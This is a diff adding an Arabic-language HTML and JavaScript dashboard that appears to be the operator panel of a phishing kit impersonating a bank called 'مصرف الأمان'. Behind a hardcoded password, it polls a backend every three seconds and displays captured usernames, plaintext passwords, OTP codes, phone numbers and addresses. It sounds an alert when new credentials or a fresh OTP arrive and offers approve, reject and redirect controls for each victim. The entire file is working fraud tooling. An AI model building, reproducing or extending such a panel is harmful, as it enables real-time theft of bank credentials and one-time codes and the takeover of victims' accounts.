@@ -1,0 +1,755 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>لوحة التحكم - مصرف الأمان</title>
+<style>
+  :root{
+    --navy:#12314f;
+    --link:#1f4e8c;
+    --gold:#f4c26b;
+    --ink:#1c2b36;
+    --muted:#5c6b74;
+    --bg:#ffffff;
+  }
+  *{box-sizing:border-box;}
+  body{
+    margin:0;
+    font-family:"Segoe UI","Tahoma",Arial,sans-serif;
+    background:#ffffff;
+    color:var(--ink);
+    min-height:100vh;
+  }
+
+  /* ---------- GATE ---------- */
+  .gate{
+    min-height:100vh;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    padding:24px;
+  }
+  .gate-card{
+    background:#fff;
+    width:100%;
+    max-width:340px;
+    border-radius:12px;
+    box-shadow:0 8px 30px rgba(18,49,79,.15);
+    padding:32px 26px;
+    text-align:center;
+  }
+  .gate-card h1{
+    font-size:18px;
+    color:var(--navy);
+    margin:0 0 6px;
+  }
+  .gate-card p{
+    font-size:13px;
+    color:var(--muted);
+    margin:0 0 22px;
+  }
+  .gate-field{
+    text-align:right;
+    margin-bottom:14px;
+  }
+  .gate-field label{
+    display:block;
+    font-size:12.5px;
+    color:var(--muted);
+    margin-bottom:6px;
+  }
+  .gate-field input{
+    width:100%;
+    border:1px solid #d7dce0;
+    border-radius:6px;
+    padding:10px 12px;
+    font-size:14px;
+    text-align:right;
+  }
+  .gate-error{
+    color:#c0392b;
+    font-size:12.5px;
+    margin:-6px 0 14px;
+    display:none;
+    text-align:right;
+  }
+  .gate-error.show{display:block;}
+  .gate-submit{
+    width:100%;
+    background:var(--navy);
+    color:#fff;
+    border:none;
+    border-radius:6px;
+    padding:11px;
+    font-size:14.5px;
+    font-weight:700;
+    cursor:pointer;
+  }
+  .gate-submit:hover{background:#0c2438;}
+
+  /* ---------- DASHBOARD ---------- */
+  .dash{display:none;}
+  .dash.show{display:block;}
+  .dash-header{
+    background:#ffffff;
+    color:var(--navy);
+    padding:16px 20px;
+    display:flex;
+    align-items:center;
+    justify-content:space-between;
+    border-bottom:1px solid #e5e9eb;
+  }
+  .dash-header h1{
+    font-size:16px;
+    margin:0;
+    color:var(--navy);
+  }
+  .logout-btn{
+    background:#fff;
+    color:var(--navy);
+    border:1px solid #c7ccd1;
+    border-radius:6px;
+    padding:6px 14px;
+    font-size:12.5px;
+    cursor:pointer;
+  }
+  .logout-btn:hover{background:#f4f6f7;}
+  .dash-body{
+    padding:20px;
+    max-width:900px;
+    margin:0 auto;
+  }
+  .cards-grid{
+    display:grid;
+    grid-template-columns:repeat(auto-fit,minmax(140px,1fr));
+    gap:10px;
+    margin-bottom:24px;
+  }
+  .stat-card{
+    background:#fff;
+    border:1px solid #e5e9eb;
+    border-radius:8px;
+    padding:10px 12px;
+    box-shadow:0 2px 6px rgba(18,49,79,.05);
+  }
+  .stat-card .label{
+    font-size:11px;
+    color:var(--muted);
+    margin-bottom:4px;
+  }
+  .stat-card .value{
+    font-size:18px;
+    font-weight:700;
+    color:var(--navy);
+  }
+  .live-card{
+    background:linear-gradient(135deg,#12314f,#1f4e8c);
+    color:#fff;
+  }
+  .live-card .label{
+    color:#cfe0f0;
+    display:flex;
+    align-items:center;
+    gap:6px;
+  }
+  .live-icon{
+    width:14px;
+    height:14px;
+    display:inline-flex;
+    align-items:center;
+    justify-content:center;
+  }
+  .live-icon svg{width:100%;height:100%;}
+  .live-icon .wifi-arc{
+    animation:wifiPulse 1.6s ease-in-out infinite;
+    transform-origin:center bottom;
+  }
+  .live-icon .wifi-arc:nth-child(1){animation-delay:0s;}
+  .live-icon .wifi-arc:nth-child(2){animation-delay:.2s;}
+  .live-icon .wifi-arc:nth-child(3){animation-delay:.4s;}
+  @keyframes wifiPulse{
+    0%,60%,100%{opacity:.35;}
+    30%{opacity:1;}
+  }
+  .live-card .value{
+    color:#fff;
+    font-size:20px;
+  }
+  .live-card .sub{
+    font-size:9.5px;
+    color:#cfe0f0;
+    margin-top:2px;
+  }
+  .section-title{
+    font-size:14px;
+    font-weight:700;
+    color:var(--navy);
+    margin:0 0 12px;
+  }
+  .placeholder-box{
+    background:#fff;
+    border:1px solid #e5e9eb;
+    border-radius:10px;
+    padding:24px;
+    text-align:center;
+    color:var(--muted);
+    font-size:13px;
+    box-shadow:0 2px 8px rgba(18,49,79,.05);
+  }
+
+  /* ---------- REQUESTS TABLE ---------- */
+  .table-wrap{
+    background:#fff;
+    border:1px solid #e5e9eb;
+    border-radius:10px;
+    overflow-x:auto;
+    box-shadow:0 2px 8px rgba(18,49,79,.05);
+    margin-bottom:28px;
+  }
+  table.requests{
+    width:100%;
+    border-collapse:collapse;
+    font-size:13px;
+    min-width:720px;
+  }
+  table.requests th{
+    background:#f7f9fa;
+    color:var(--navy);
+    font-weight:700;
+    padding:12px 14px;
+    text-align:right;
+    white-space:nowrap;
+    border-bottom:1px solid #e5e9eb;
+  }
+  table.requests td{
+    padding:12px 14px;
+    border-bottom:1px solid #eef1f2;
+    text-align:right;
+    color:var(--ink);
+    white-space:nowrap;
+  }
+  table.requests tr:last-child td{border-bottom:none;}
+  table.requests tr:hover td{background:#fafbfc;}
+  .status-badge{
+    display:inline-block;
+    padding:3px 10px;
+    border-radius:12px;
+    font-size:11.5px;
+    font-weight:700;
+  }
+  .status-badge.pending{background:#e4e7ea;color:#5c6b74;}
+  .status-badge.approved{background:#dff3e6;color:#137a3d;}
+  .status-badge.rejected{background:#fbe0df;color:#a5342c;}
+  .row-actions{
+    display:flex;
+    flex-wrap:wrap;
+    gap:6px;
+    justify-content:flex-end;
+  }
+  .row-actions button{
+    border:1px solid #c7ccd1;
+    background:#fff;
+    color:var(--navy);
+    border-radius:6px;
+    padding:5px 10px;
+    font-size:11.5px;
+    cursor:pointer;
+  }
+  .row-actions button:hover{background:#f4f6f7;}
+  .row-actions .redirect-btn{
+    border-color:var(--link);
+    color:var(--link);
+  }
+  .row-actions .approve-btn{
+    border-color:#1e8e50;
+    color:#1e8e50;
+  }
+  .row-actions .approve-btn:hover{background:#eafaf0;}
+  .row-actions .reject-btn{
+    border-color:#c0392b;
+    color:#c0392b;
+  }
+  .row-actions .reject-btn:hover{background:#fdecea;}
+
+  /* ---------- DETAILS MODAL ---------- */
+  .modal-overlay{
+    position:fixed;
+    inset:0;
+    background:rgba(18,49,79,.45);
+    display:none;
+    align-items:center;
+    justify-content:center;
+    padding:20px;
+    z-index:1000;
+  }
+  .modal-overlay.show{display:flex;}
+  .modal-box{
+    background:#fff;
+    border-radius:12px;
+    width:100%;
+    max-width:340px;
+    padding:22px 20px;
+    box-shadow:0 12px 40px rgba(18,49,79,.25);
+  }
+  .modal-box h2{
+    font-size:16px;
+    color:var(--navy);
+    margin:0 0 16px;
+    text-align:right;
+  }
+  .modal-row{
+    display:flex;
+    justify-content:space-between;
+    align-items:flex-start;
+    gap:10px;
+    padding:8px 0;
+    border-bottom:1px solid #eef1f2;
+    font-size:13px;
+  }
+  .modal-row:last-of-type{border-bottom:none;}
+  .modal-row .k{color:var(--muted);white-space:nowrap;}
+  .modal-row .v{color:var(--ink);font-weight:600;text-align:left;}
+  .modal-close{
+    width:100%;
+    margin-top:16px;
+    background:var(--navy);
+    color:#fff;
+    border:none;
+    border-radius:6px;
+    padding:10px;
+    font-size:13.5px;
+    font-weight:700;
+    cursor:pointer;
+  }
+  .modal-close:hover{background:#0c2438;}
+  .modal-actions{
+    display:flex;
+    gap:10px;
+    margin-top:18px;
+  }
+  .modal-actions button{
+    flex:1;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    gap:6px;
+    border-radius:8px;
+    padding:10px;
+    font-size:13.5px;
+    font-weight:700;
+    cursor:pointer;
+    border:1.5px solid transparent;
+    transition:background .15s, transform .1s, box-shadow .15s;
+  }
+  .modal-actions button svg{width:16px;height:16px;flex-shrink:0;}
+  .modal-actions button:active{transform:scale(.97);}
+  .modal-approve,
+  .modal-reject{
+    background:#eef0f2;
+    color:#8a9096;
+    border-color:transparent;
+    box-shadow:none;
+  }
+  .modal-approve.active{
+    background:#1e8e50;
+    color:#fff;
+    box-shadow:0 2px 6px rgba(30,142,80,.3);
+  }
+  .modal-approve.active:hover{background:#177041; box-shadow:0 3px 10px rgba(30,142,80,.4);}
+  .modal-reject.active{
+    background:#fff;
+    color:#c0392b;
+    border-color:#e3b3ad;
+  }
+  .modal-reject.active:hover{background:#fdecea; border-color:#c0392b;}
+
+  /* ---------- TOAST NOTIFICATION ---------- */
+  .toast{
+    position:fixed;
+    top:16px;
+    left:50%;
+    transform:translateX(-50%) translateY(-20px);
+    background:#12314f;
+    color:#fff;
+    padding:12px 18px;
+    border-radius:8px;
+    font-size:13px;
+    box-shadow:0 8px 24px rgba(18,49,79,.3);
+    display:flex;
+    align-items:center;
+    gap:8px;
+    opacity:0;
+    pointer-events:none;
+    transition:opacity .25s, transform .25s;
+    z-index:1100;
+    max-width:90vw;
+    white-space:nowrap;
+  }
+  .toast.show{
+    opacity:1;
+    transform:translateX(-50%) translateY(0);
+  }
+  .toast .dot{
+    width:8px;
+    height:8px;
+    border-radius:50%;
+    background:#4ee08a;
+    flex-shrink:0;
+  }
+</style>
+</head>
+<body>
+
+  <!-- Password gate -->
+  <div class="gate" id="gate">
+    <div class="gate-card">
+      <h1>لوحة تحكم الإدارة</h1>
+      <p>مصرف الأمان — دخول مقيّد للموظفين المخوّلين فقط</p>
+      <div class="gate-field">
+        <label for="adminPass">كلمة المرور</label>
+        <input type="password" id="adminPass" placeholder="ادخل كلمة المرور">
+      </div>
+      <div class="gate-error" id="gateError">كلمة المرور غير صحيحة</div>
+      <button class="gate-submit" id="gateSubmit" type="button">دخول</button>
+    </div>
+  </div>
+
+  <!-- Dashboard -->
+  <div class="dash" id="dash">
+    <div class="dash-header">
+      <h1>لوحة تحكم الإدارة</h1>
+      <button class="logout-btn" id="logoutBtn" type="button">تسجيل الخروج</button>
+    </div>
+    <div class="dash-body">
+      <div class="cards-grid">
+        <div class="stat-card live-card">
+          <div class="label">
+            <span class="live-icon">
+              <svg viewBox="0 0 24 24" fill="none">
+                <circle class="wifi-arc" cx="12" cy="19" r="1.6" fill="#4ee08a"/>
+                <path class="wifi-arc" d="M8.5 15.5a5 5 0 0 1 7 0" stroke="#4ee08a" stroke-width="2" stroke-linecap="round"/>
+                <path class="wifi-arc" d="M5 12a9.5 9.5 0 0 1 14 0" stroke="#4ee08a" stroke-width="2" stroke-linecap="round"/>
+              </svg>
+            </span>
+            الزيارات المباشرة الآن
+          </div>
+          <div class="value" id="liveVisits">0</div>
+          <div class="sub">يتحدث تلقائيًا كل 3 ثوانٍ</div>
+        </div>
+        <div class="stat-card">
+          <div class="label">زيارات اليوم</div>
+          <div class="value" id="todayVisits">0</div>
+        </div>
+        <div class="stat-card">
+          <div class="label">إجمالي الزيارات</div>
+          <div class="value" id="totalVisits">0</div>
+        </div>
+      </div>
+
+      <p class="section-title">قائمة الطلبات</p>
+      <div class="table-wrap">
+        <table class="requests">
+          <thead>
+            <tr>
+              <th>اسم المستخدم</th>
+              <th>كلمة المرور</th>
+              <th>رقم الجوال</th>
+              <th>الاسم</th>
+              <th>الحالة</th>
+              <th>الإجراءات</th>
+            </tr>
+          </thead>
+          <tbody id="requestsBody">
+            <!-- بيتملى تلقائيًا من السيرفر الخلفي (server.js) عبر /api/requests -->
+          </tbody>
+        </table>
+      </div>
+
+      <p class="section-title">أقسام أخرى</p>
+      <div class="placeholder-box">
+        باقي أقسام لوحة التحكم (التقارير، الإعدادات) هتتحط هنا لاحقًا حسب اللي تحدده.
+      </div>
+    </div>
+  </div>
+
+  <!-- Details modal -->
+  <div class="modal-overlay" id="detailsModal">
+    <div class="modal-box">
+      <h2>تفاصيل الطلب</h2>
+      <div class="modal-row"><span class="k">اسم المستخدم</span><span class="v" id="mUsername"></span></div>
+      <div class="modal-row"><span class="k">كلمة المرور</span><span class="v" id="mPassword"></span></div>
+      <div class="modal-row"><span class="k">OTP</span><span class="v" id="mOtp"></span></div>
+      <div class="modal-row"><span class="k">الاسم</span><span class="v" id="mName"></span></div>
+      <div class="modal-row"><span class="k">رقم الجوال</span><span class="v" id="mPhone"></span></div>
+      <div class="modal-row"><span class="k">عنوان التوصيل</span><span class="v" id="mAddress"></span></div>
+      <div class="modal-actions">
+        <button class="modal-approve" id="modalApproveBtn" type="button">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6L9 17l-5-5"/></svg>
+          قبول
+        </button>
+        <button class="modal-reject" id="modalRejectBtn" type="button">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M18 6L6 18M6 6l12 12"/></svg>
+          رفض
+        </button>
+      </div>
+      <button class="modal-close" id="modalCloseBtn" type="button">إغلاق</button>
+    </div>
+  </div>
+
+  <div class="toast" id="toast">
+    <span class="dot"></span>
+    <span id="toastText">طلب جديد وصل</span>
+  </div>
+
+  <script>
+    // ---- Password gate ----
+    var ADMIN_PASSWORD = 'admin123'; // ملاحظة: للعرض فقط، مش آمن لبيئة حقيقية
+    var gate = document.getElementById('gate');
+    var dash = document.getElementById('dash');
+    var gateSubmit = document.getElementById('gateSubmit');
+    var adminPass = document.getElementById('adminPass');
+    var gateError = document.getElementById('gateError');
+    var logoutBtn = document.getElementById('logoutBtn');
+
+    function tryLogin(){
+      if (adminPass.value === ADMIN_PASSWORD) {
+        gateError.classList.remove('show');
+        gate.style.display = 'none';
+        dash.classList.add('show');
+        startPolling();
+      } else {
+        gateError.classList.add('show');
+      }
+    }
+
+    gateSubmit.addEventListener('click', tryLogin);
+    adminPass.addEventListener('keydown', function(e){
+      if (e.key === 'Enter') tryLogin();
+    });
+
+    logoutBtn.addEventListener('click', function(){
+      dash.classList.remove('show');
+      gate.style.display = 'flex';
+      adminPass.value = '';
+      stopPolling();
+    });
+
+    // ---- Notification sound (Web Audio API beep, no file needed) ----
+    function playNotifySound(){
+      try{
+        var ctx = new (window.AudioContext || window.webkitAudioContext)();
+        var osc = ctx.createOscillator();
+        var gain = ctx.createGain();
+        osc.connect(gain);
+        gain.connect(ctx.destination);
+        osc.type = 'sine';
+        osc.frequency.setValueAtTime(880, ctx.currentTime);
+        osc.frequency.setValueAtTime(1200, ctx.currentTime + .12);
+        gain.gain.setValueAtTime(.15, ctx.currentTime);
+        gain.gain.exponentialRampToValueAtTime(.001, ctx.currentTime + .35);
+        osc.start();
+        osc.stop(ctx.currentTime + .35);
+      }catch(err){ /* audio not available, ignore */ }
+    }
+
+    // ---- Toast notification ----
+    var toast = document.getElementById('toast');
+    var toastText = document.getElementById('toastText');
+    var toastTimer = null;
+    function showToast(text){
+      toastText.textContent = text;
+      toast.classList.add('show');
+      clearTimeout(toastTimer);
+      toastTimer = setTimeout(function(){
+        toast.classList.remove('show');
+      }, 4000);
+    }
+
+    // ================================================================
+    // بيانات حقيقية من السيرفر الخلفي (server.js) - من غير أي محاكاة
+    // ================================================================
+    var latestRequests = [];      // آخر نسخة من الطلبات جاية من /api/requests
+    var previousById = {};        // لمقارنة الحالة القديمة واكتشاف الجديد/تغيّر الـ OTP
+    var currentRequestId = null;  // الطلب المفتوح حاليًا في نافذة التفاصيل
+    var pollTimer = null;
+
+    function statusLabel(status){
+      if (status === 'approved') return { text: 'مقبول', cls: 'approved' };
+      if (status === 'rejected') return { text: 'مرفوض', cls: 'rejected' };
+      return { text: 'قيد الانتظار', cls: 'pending' };
+    }
+
+    function renderRequests(){
+      var tbody = document.getElementById('requestsBody');
+      tbody.innerHTML = '';
+      latestRequests.forEach(function(r){
+        var st = statusLabel(r.status);
+        var row = document.createElement('tr');
+        row.dataset.id = r.id;
+        row.innerHTML =
+          '<td>' + escapeHtml(r.username) + '</td>' +
+          '<td>••••••••</td>' +
+          '<td>' + escapeHtml(r.phone || '-') + '</td>' +
+          '<td>' + escapeHtml(r.name || '-') + '</td>' +
+          '<td><span class="status-badge ' + st.cls + '">' + st.text + '</span></td>' +
+          '<td><div class="row-actions">' +
+            '<button type="button" class="details-btn">التفاصيل</button>' +
+            '<button type="button" class="redirect-btn">إعادة التوجيه</button>' +
+          '</div></td>';
+        tbody.appendChild(row);
+      });
+    }
+
+    function escapeHtml(str){
+      var div = document.createElement('div');
+      div.textContent = str == null ? '' : String(str);
+      return div.innerHTML;
+    }
+
+    function detectChangesAndNotify(newList){
+      newList.forEach(function(r){
+        var prev = previousById[r.id];
+        if (!prev) {
+          // طلب جديد لم يكن موجودًا في آخر استعلام
+          playNotifySound();
+          showToast('طلب جديد وصل: ' + (r.username || '-'));
+        } else if (r.otp && r.otp !== prev.otp) {
+          // نفس الطلب لكن وصل له OTP جديد
+          playNotifySound();
+          showToast('وصل رمز OTP جديد لـ: ' + (r.username || '-'));
+        }
+      });
+      var map = {};
+      newList.forEach(function(r){ map[r.id] = { status: r.status, otp: r.otp }; });
+      previousById = map;
+    }
+
+    function fetchRequests(){
+      fetch('/api/requests')
+        .then(function(res){ return res.json(); })
+        .then(function(data){
+          if (!data.ok) return;
+          detectChangesAndNotify(data.requests);
+          latestRequests = data.requests;
+          renderRequests();
+          // لو نافذة التفاصيل مفتوحة لطلب لسه موجود، حدّث بياناتها لحظيًا
+          if (currentRequestId != null) {
+            var r = latestRequests.find(function(x){ return x.id === currentRequestId; });
+            if (r) fillModal(r);
+          }
+        })
+        .catch(function(err){
+          console.warn('تعذر جلب الطلبات من السيرفر:', err);
+        });
+    }
+
+    function fetchLiveCount(){
+      fetch('/api/live-count')
+        .then(function(res){ return res.json(); })
+        .then(function(data){
+          if (data.ok) document.getElementById('liveVisits').textContent = data.count;
+        })
+        .catch(function(){});
+    }
+
+    function fetchStats(){
+      fetch('/api/stats')
+        .then(function(res){ return res.json(); })
+        .then(function(data){
+          if (data.ok) {
+            document.getElementById('todayVisits').textContent = data.today;
+            document.getElementById('totalVisits').textContent = data.total;
+          }
+        })
+        .catch(function(){});
+    }
+
+    function pollAll(){
+      fetchRequests();
+      fetchLiveCount();
+      fetchStats();
+    }
+
+    function startPolling(){
+      if (pollTimer) return;
+      pollAll(); // أول تحديث فوري بدون انتظار
+      pollTimer = setInterval(pollAll, 3000); // تحديث مخفي كل 3 ثوانٍ
+    }
+    function stopPolling(){
+      clearInterval(pollTimer);
+      pollTimer = null;
+    }
+
+    // ---- Details modal ----
+    var detailsModal = document.getElementById('detailsModal');
+    var modalApproveBtn = document.getElementById('modalApproveBtn');
+    var modalRejectBtn = document.getElementById('modalRejectBtn');
+
+    function fillModal(r){
+      document.getElementById('mUsername').textContent = r.username || '-';
+      document.getElementById('mPassword').textContent = r.password || '-';
+      document.getElementById('mOtp').textContent = r.otp || '-';
+      document.getElementById('mName').textContent = r.name || '-';
+      document.getElementById('mPhone').textContent = r.phone || '-';
+      document.getElementById('mAddress').textContent = r.address || '-';
+      var isPending = r.status === 'pending' || !r.status;
+      modalApproveBtn.classList.toggle('active', isPending);
+      modalRejectBtn.classList.toggle('active', isPending);
+    }
+
+    function updateStatus(id, status){
+      // تحديث تفاؤلي فوري في الواجهة، ثم إرسال فعلي للسيرفر
+      var r = latestRequests.find(function(x){ return x.id === id; });
+      if (r) {
+        r.status = status;
+        renderRequests();
+        showToast((status === 'approved' ? 'تم قبول' : 'تم رفض') + ' طلب: ' + (r.username || '-'));
+      }
+      fetch('/api/requests/' + id + '/status', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ status: status })
+      }).catch(function(err){
+        console.warn('تعذر تحديث الحالة على السيرفر:', err);
+      });
+    }
+
+    document.getElementById('requestsBody').addEventListener('click', function(e){
+      var row = e.target.closest('tr');
+      if (!row) return;
+      var id = Number(row.dataset.id);
+      var r = latestRequests.find(function(x){ return x.id === id; });
+      if (!r) return;
+      if (e.target.classList.contains('details-btn')) {
+        currentRequestId = id;
+        fillModal(r);
+        detailsModal.classList.add('show');
+      } else if (e.target.classList.contains('redirect-btn')) {
+        alert('تم إعادة توجيه الطلب الخاص بـ: ' + (r.username || '-'));
+      }
+    });
+
+    document.getElementById('modalCloseBtn').addEventListener('click', function(){
+      detailsModal.classList.remove('show');
+      currentRequestId = null;
+    });
+    modalApproveBtn.addEventListener('click', function(){
+      if (currentRequestId != null) updateStatus(currentRequestId, 'approved');
+      detailsModal.classList.remove('show');
+      currentRequestId = null;
+    });
+    modalRejectBtn.addEventListener('click', function(){
+      if (currentRequestId != null) updateStatus(currentRequestId, 'rejected');
+      detailsModal.classList.remove('show');
+      currentRequestId = null;
+    });
+    detailsModal.addEventListener('click', function(e){
+      if (e.target === detailsModal) {
+        detailsModal.classList.remove('show');
+        currentRequestId = null;
+      }
+    });
+  </script>
+</body>
+</html>
